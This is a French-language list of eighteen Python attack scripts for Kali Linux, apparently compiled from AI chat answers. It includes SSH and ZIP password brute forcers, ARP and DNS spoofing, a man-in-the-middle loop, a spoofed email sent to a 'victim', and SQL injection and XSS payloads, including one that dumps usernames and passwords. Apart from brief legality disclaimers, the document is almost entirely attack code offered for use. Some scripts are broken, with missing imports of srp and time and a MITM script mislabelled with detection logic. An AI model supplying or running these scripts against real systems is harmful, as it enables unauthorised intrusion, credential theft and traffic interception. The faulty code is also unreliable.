# Quelques scripts Python utiles pour la cybersécurité que vous pouvez utiliser sur Kali Linux :
- Ces scripts doivent être utilisés de manière éthique et légale, toujours avec l'autorisation des propriétaires des systèmes que vous testez.
- Ces scripts offrent une gamme d'outils pour différentes techniques de tests de sécurité. Comme toujours, assurez-vous d'utiliser ces outils de manière éthique et légale.
- Ces scripts sont puissants et doivent être utilisés avec une grande prudence. Ils nécessitent des connaissances avancées en réseaux et sécurité pour être correctement utilisés et interprétés.
- Assurez-vous de respecter les lois et réglementations locales lors de l'utilisation de ces outils.

### 1. **Port Scanner**
```python
import socket

def port_scan(ip, start_port, end_port):
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"Port {port}: Open")
        sock.close()

ip = '127.0.0.1'  # Change this to the target IP
start_port = 1
end_port = 1024

port_scan(ip, start_port, end_port)
```

### 2. **Simple Web Crawler**
```python
import requests
from bs4 import BeautifulSoup

def web_crawler(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and href.startswith('http'):
                print(href)
    except requests.exceptions.RequestException as e:
        print(e)

url = 'http://example.com'  # Change this to the target URL
web_crawler(url)
```

### 3. **Password Cracker (Brute Force)**
```python
import zipfile

def extract_zip(zip_file, password):
    try:
        zip_file.extractall(pwd=password.encode())
        print(f"Password found: {password}")
        return True
    except:
        return False

zip_file = zipfile.ZipFile('protected.zip')  # Change this to the target ZIP file

with open('passwords.txt', 'r') as file:  # Change this to your password list
    for line in file.readlines():
        password = line.strip()
        if extract_zip(zip_file, password):
            break
```

### 4. **Network Sniffer**
```python
import socket

def sniff_packets():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    while True:
        raw_data, addr = conn.recvfrom(65536)
        print(f"Packet received from {addr}")

sniff_packets()
```

### 5. **SSH Brute Force**
```python
import paramiko

def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Password found: {password}")
            return
        except paramiko.AuthenticationException:
            continue

target_ip = '192.168.1.1'  # Change this to the target IP
username = 'root'  # Change this to the target username
password_list = ['password1', 'password2', 'password3']  # Add more passwords to the list

ssh_brute_force(target_ip, username, password_list)
```

Bien sûr, voici quelques scripts supplémentaires pour la cybersécurité :

### 6. **ARP Spoofing**
```python
from scapy.all import ARP, Ether, send

def arp_spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=interface, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

target_ip = '192.168.1.100'  # Change this to the target IP
spoof_ip = '192.168.1.1'  # Change this to the IP to spoof
interface = 'eth0'  # Change this to your network interface

arp_spoof(target_ip, spoof_ip, interface)
```

### 7. **DNS Spoofing**
```python
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='192.168.1.100'))
        send(spoofed_pkt, verbose=False)

sniff(iface='eth0', filter='udp port 53', prn=dns_spoof)
```

### 8. **Email Spoofing**
```python
import smtplib

def send_email(subject, body, to_email):
    from_email = 'your_email@example.com'  # Change this to your email
    password = 'your_password'  # Change this to your email password

    message = f'Subject: {subject}\n\n{body}'
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, message)
    server.quit()

subject = 'Important Update'
body = 'This is a spoofed email.'
to_email = 'victim@example.com'  # Change this to the victim's email

send_email(subject, body, to_email)
```

### 9. **MITM Proxy**
```python
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_host == "example.com":
        flow.response = http.Response.make(
            200,
            b"Hello, World",
            {"Content-Type": "text/html"}
        )
```

### 10. **SQL Injection Scanner**
```python
import requests

def sql_injection_scan(url, payloads):
    for payload in payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        if "SQL syntax" in response.text:
            print(f"Potential SQL injection vulnerability found with payload: {payload}")

url = 'http://example.com/page.php?id='  # Change this to the target URL
payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR ''='"]

sql_injection_scan(url, payloads)
```

### 11. **Directory Brute Forcer**
```python
import requests

def dir_brute_force(url, wordlist):
    for word in wordlist:
        full_url = f"{url}/{word}"
        response = requests.get(full_url)
        if response.status_code == 200:
            print(f"Found: {full_url}")

url = 'http://example.com'  # Change this to the target URL
wordlist = ['admin', 'login', 'dashboard']  # Add more directories to the list

dir_brute_force(url, wordlist)
```

### 12. **XSS Scanner**
```python
import requests

def xss_scan(url, payloads):
    for payload in payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        if payload in response.text:
            print(f"Potential XSS vulnerability found with payload: {payload}")

url = 'http://example.com/search?q='  # Change this to the target URL
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

xss_scan(url, payloads)
```

D'accord, voici des scripts plus avancés et puissants pour la cybersécurité. Ces scripts nécessitent une attention particulière en termes d'éthique et de légalité, car ils peuvent causer des dommages sérieux s'ils sont utilisés de manière inappropriée.

### 13. **Advanced ARP Spoofing with Packet Interception**
```python
from scapy.all import ARP, Ether, srp, send, sniff, wrpcap

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

target_ip = "192.168.1.100"  # Change to the target IP
gateway_ip = "192.168.1.1"  # Change to the gateway IP

try:
    print("[*] Starting ARP spoofing...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] Network restored.")
```

### 14. **Multi-Threaded SSH Brute Forcer**
```python
import paramiko
import threading

def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Password found: {password}")
            return
        except paramiko.AuthenticationException:
            continue

def load_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

target_ip = '192.168.1.1'  # Change to the target IP
username = 'root'  # Change to the target username
password_file = 'passwords.txt'  # Change to the path of your password file

password_list = load_passwords(password_file)
threads = []

for i in range(5):  # Adjust the number of threads
    t = threading.Thread(target=ssh_brute_force, args=(target_ip, username, password_list[i::5]))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```

### 15. **Man-in-the-Middle (MITM) Attack**
```python
from scapy.all import ARP, Ether, srp, send, sniff

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def sniff_packets(interface):
    sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 2:
        try:
            real_mac = get_mac(packet[ARP].psrc)
            response_mac = packet[ARP].hwsrc
            if real_mac != response_mac:
                print(f"[*] Potential ARP spoofing attack detected: {packet[ARP].psrc} is at {response_mac}, should be {real_mac}")
        except IndexError:
            pass

target_ip = "192.168.1.100"  # Change to the target IP
gateway_ip = "192.168.1.1"  # Change to the gateway IP
interface = "eth0"  # Change to your network interface

try:
    print("[*] Starting ARP spoofing...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] Network restored.")
finally:
    print("[*] Sniffing packets...")
    sniff_packets(interface)
```

### 16. **Advanced SQL Injection Automation**
```python
import requests
from urllib.parse import urljoin

def sql_injection_scan(url, payloads):
    for payload in payloads:
        target_url = urljoin(url, payload)
        response = requests.get(target_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"Potential SQL injection vulnerability found with payload: {payload}")

url = 'http://example.com/page.php?id='  # Change to the target URL
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' OR 'a'='a",
    "' OR ''='"
]

sql_injection_scan(url, payloads)
```

### 17. **Automated Exploit Framework**
```python
import subprocess

def execute_exploit(exploit_script, target):
    process = subprocess.Popen(['python3', exploit_script, target], stdout=subprocess.PIPE)
    output, error = process.communicate()
    if error:
        print(f"Error executing {exploit_script}: {error}")
    else:
        print(f"Output from {exploit_script}: {output}")

def load_exploits(exploits_file):
    with open(exploits_file, 'r') as file:
        return [line.strip() for line in file]

target = '192.168.1.100'  # Change to the target IP
exploits_file = 'exploits.txt'  # Change to the path of your exploits file

exploits = load_exploits(exploits_file)

for exploit in exploits:
    execute_exploit(exploit, target)
```

### 18. **Advanced Network Sniffer with Filtering**
```python
from scapy.all import sniff

def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"TCP Packet: {packet.summary()}")
    elif packet.haslayer(UDP):
        print(f"UDP Packet: {packet.summary()}")
    elif packet.haslayer(ICMP):
        print(f"ICMP Packet: {packet.summary()}")

sniff(filter="tcp or udp or icmp", prn=packet_callback, store=0)
```
